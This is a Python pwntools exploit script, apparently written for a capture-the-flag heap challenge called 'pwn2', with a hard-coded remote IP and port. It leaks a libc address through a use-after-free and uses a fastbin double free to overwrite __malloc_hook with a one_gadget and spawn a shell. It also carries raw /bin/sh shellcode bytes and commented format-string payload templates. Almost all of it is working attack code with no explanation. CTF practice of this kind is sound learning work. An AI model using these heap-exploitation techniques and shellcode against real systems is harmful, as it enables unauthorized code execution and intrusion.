# -*- coding: utf-8 -*-
from pwn import *
from libformatstr import FormatStr
context.log_level = 'debug'
context(arch='amd64', os='linux')
# context(arch='i386', os='linux')
local = 1
elf = ELF('./pwn2')
if local:
    p = process('./pwn2')
    libc = elf.libc
else:
    p = remote('116.85.48.105',5005)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
#onegadget64(libc.so.6)
# one = [0x45216,0x4526a,0xf02a4,0xf1147]
# [rax == NULL;[rsp+0x30] == NULL,[rsp+0x50] == NULL,[rsp+0x70] == NULL]
#onegadget32(libc.so.6)  0x3ac5c  0x3ac5e  0x3ac62  0x3ac69  0x5fbc5  0x5fbc6
# py32 = fmtstr_payload(start_read_offset,{xxx_got:system_addr})
# sl(py32)
# py64 = FormatStr(isx64=1)
# py64[printf_got] = onegadget
# sl(py64.payload(start_read_offset))
shellcode = asm(shellcraft.sh())
shellcode32 = '\x68\x01\x01\x01\x01\x81\x34\x24\x2e\x72\x69\x01\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\x6a\x0b\x58\xcd\x80' 
#shellcode64 = '\x48\xb8\x01\x01\x01\x01\x01\x01\x01\x01\x50\x48\xb8\x2e\x63\x68\x6f\x2e\x72\x69\x01\x48\x31\x04\x24\x48\x89\xe7\x31\xd2\x31\xf6\x6a\x3b\x58\x0f\x05'
#shellcode64 = '\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05'
sl = lambda s : p.sendline(s)
sd = lambda s : p.send(s)
rc = lambda n : p.recv(n)
ru = lambda s : p.recvuntil(s)
ti = lambda : p.interactive()
# libc.address = libc_addr
def debug(addr,PIE=True):
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
        gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
    else:
        gdb.attach(p,"b *{}".format(hex(addr)))

def bk(addr):
    gdb.attach(p,"b *"+str(hex(addr)))

def malloc(index,size,content):
	ru("Your Choice")
	sl('1')
	ru("index>> ")
	sl(str(index))
	ru("size>> ")
	sl(str(size))
	ru("name>> ")
	sd(content)
def free(index):
	ru("Your Choice")
	sl('2')
	ru("index>> ")
	sl(str(index))
def edit(index,content):
	ru("Your Choice")
	sl('3')
	ru("index>> ")
	sl(str(index))
	ru("name>> ")
	sd(content)
def show(index):
	ru("Your Choice")
	sl('5')
	ru("index>> ")
	sl(str(index))

malloc(0,0x100,'aaaa')
malloc(1,0x68,'bbbb')
malloc(2,0x68,'bbbb')
malloc(3,0x78,'bbbb')
malloc(4,0x100,'a')
malloc(5,0x100,'a')
free(0)
show(0)
addr = u64(rc(6).ljust(8,'\x00'))-0x3c4b78
print "addr--->"+hex(addr)
malloc_hook = addr + libc.sym["__malloc_hook"]
fake_chunk = malloc_hook-0x23
onegadget = addr + 0x4527a
realloc = addr + libc.sym['realloc']
free(1)
free(2)
free(1)
free(4)
malloc(6,0x68,p64(fake_chunk))
malloc(7,0x68,p64(fake_chunk))
malloc(8,0x68,p64(fake_chunk))
malloc(9,0x68,'a'*11+p64(onegadget)+p64(realloc))
ru("Your Choice")
sl('1')
ru("index>> ")
sl(str(10))
ru("size>> ")
sl(str(0x120))

p.interactive()
